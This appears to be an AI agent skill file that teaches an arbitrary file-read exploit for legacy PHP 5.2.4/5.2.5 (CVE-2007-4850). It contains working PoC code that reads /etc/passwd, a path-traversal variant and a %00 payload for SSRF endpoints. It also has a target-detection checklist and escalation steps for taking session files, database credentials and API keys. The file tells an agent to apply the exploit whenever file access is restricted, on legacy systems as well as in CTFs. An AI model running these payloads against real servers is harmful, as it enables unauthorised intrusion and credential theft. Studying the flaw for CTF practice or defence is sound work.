---
name: php-curl-bypass
description: How to bypass PHP safe_mode and open_basedir restrictions using cURL on legacy PHP 5.2.4/5.2.5 (CVE-2007-4850). Use this skill whenever you need to read arbitrary files from a PHP server with restricted file access, especially in CTFs or legacy systems. Trigger this when you see PHP 5.2.x with cURL enabled, or when standard file operations are blocked by safe_mode/open_basedir but you suspect cURL might work.
---

# PHP cURL File Read Bypass (CVE-2007-4850)

A technique to read arbitrary local files on PHP 5.2.4 and 5.2.5 by exploiting a NUL-byte handling bug in the cURL extension's safe_mode/open_basedir checks.

## When to Use This

- You've identified PHP 5.2.4 or 5.2.5 (check `phpinfo()` output)
- `ext/curl` is enabled (`cURL support => enabled`)
- `safe_mode` or `open_basedir` is restricting file access
- Standard file operations (`file_get_contents`, `fopen`, etc.) are blocked
- You need to read sensitive files like `/etc/passwd`, config files, or source code

## The Vulnerability

**CVE-2007-4850**: PHP 5.2.4/5.2.5 performed path validation on `file://` URLs in cURL before the NUL byte, but libcurl used the path after the NUL byte. This mismatch allows bypassing safe_mode/open_basedir restrictions.

## Quick PoC (One-Liner)

```php
var_dump(curl_exec(curl_init("file://safe_mode_bypass\x00".__FILE__)));
```

This reads the current script file despite restrictions.

## Full PoC (Arbitrary File Read)

```php
<?php
// Target file to read
$target = '/etc/passwd';

// Initialize cURL
$ch = curl_init();

// The NUL byte (\x00) bypasses the path check
// Use chr(0) or \x00 in double quotes - %00 won't work reliably
curl_setopt($ch, CURLOPT_URL, 'file://prefix'.chr(0).$target);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

// Execute and get response
$resp = curl_exec($ch);
$err  = curl_error($ch);
curl_close($ch);

if ($resp !== false) {
    echo $resp;
} else {
    echo "cURL error: $err\n";
}
?>
```

## Advanced Techniques

### Path Traversal After NUL

If direct paths are blocked, use relative traversal:

```php
curl_setopt($ch, CURLOPT_URL, 'file://x'.chr(0).'../../../../etc/passwd');
```

The traversal is resolved by libcurl, not the open_basedir guard.

### SSRF-Like Endpoints

If you can't upload PHP code but the server mirrors user-controlled URLs into `curl_exec()`, send:

```
file://prefix%00/etc/passwd
```

Note: URL-encode the NUL as `%00` in HTTP requests (the server will decode it).

## Detection Checklist

Before attempting this bypass, verify:

1. **PHP Version**: Look for `PHP Version => 5.2.4` or `5.2.5` in `phpinfo()`
2. **cURL Extension**: Check for `cURL support => enabled`
3. **Restrictions Active**: Confirm `safe_mode => On` or `open_basedir` is set
4. **allow_url_fopen**: This bypass works even if `allow_url_fopen` is disabled (cURL handles `file://` internally)

## Limitations

- **Version-specific**: Only works on PHP 5.2.4 and 5.2.5
- **Fixed in 5.2.6+**: Later versions patched the parsing/validation
- **File read only**: This is a read primitive, not code execution
- **Requires cURL**: The `ext/curl` extension must be loaded

## Escalation Paths

This is a file read primitive. Combine with other techniques:

- **Log poisoning**: Write to log files, then include them
- **Session file inclusion**: Read session files for credentials
- **Config file extraction**: Get database credentials, API keys
- **Source code disclosure**: Read application source for other vulnerabilities

## Related Historical Bypasses

- **CVE-2006-2563**: Earlier NUL-byte issue in PHP 4.4.2/5.1.4 cURL wrappers
- **PHP bugs #30609/#36223**: Early cURL open_basedir issues without canonicalization

## References

- [CVE-2007-4850](https://ubuntu.com/security/CVE-2007-4850)
- [Original analysis](http://blog.safebuff.com/2016/05/06/disable-functions-bypass/)
- [cxsecurity writeup](http://cxsecurity.com/issue/WLB-2008010060)
- [PHP bug #36223](https://bugs.php.net/bug.php?id=36223)

## CTF Tips

1. Always check `phpinfo()` first to confirm version and extensions
2. Try this before giving up on file access in legacy PHP challenges
3. If `allow_url_fopen` is disabled, cURL might still work
4. Look for SSRF-like endpoints that accept URLs as input
5. Combine with other primitives for full exploitation
